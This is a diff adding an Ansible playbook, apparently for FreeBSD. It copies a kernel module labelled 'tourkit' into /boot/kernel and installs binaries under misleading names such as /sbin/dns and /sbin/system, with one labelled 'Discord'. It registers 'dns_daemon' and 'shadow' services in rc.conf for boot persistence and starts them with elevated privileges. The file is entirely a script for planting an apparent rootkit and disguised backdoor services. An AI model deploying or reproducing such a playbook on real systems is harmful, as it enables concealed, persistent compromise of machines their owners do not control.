@@ -1,0 +1,47 @@
+---
+- name: Copying tourkit
+  copy:
+    src: vmn.ko
+    dest: /boot/kernel/vmn.ko
+    mode: 0555
+
+- name: Copying daemon
+  copy:
+    src: dns
+    dest: /sbin/dns
+    mode: 0555
+
+- name: Copying dns service
+  copy:
+    src: dns_daemon
+    dest: /etc/rc.d/dns_daemon
+    mode: 0555
+
+- name: Copying Discord 
+  copy:
+    src: system
+    dest: /sbin/system
+    mode: 0555
+
+- name: Discord service
+  copy:
+    src: shadow
+    dest: /etc/rc.d/shadow
+    mode: 0555
+
+# - name: Running Discord shell (Come back)
+#   shell: /sbin/system &
+
+- name: Editing rc.conf
+  shell: echo "dns_daemon=\"YES\"" >> /etc/rc.conf
+
+- name: Editing rc.conf2
+  shell: echo "shadow=\"YES\"" >> /etc/rc.conf
+
+- name: start dns service
+  shell: service dns_daemon start
+  become: yes
+
+- name: start shadow service
+  shell: service shadow start
+  become: yes
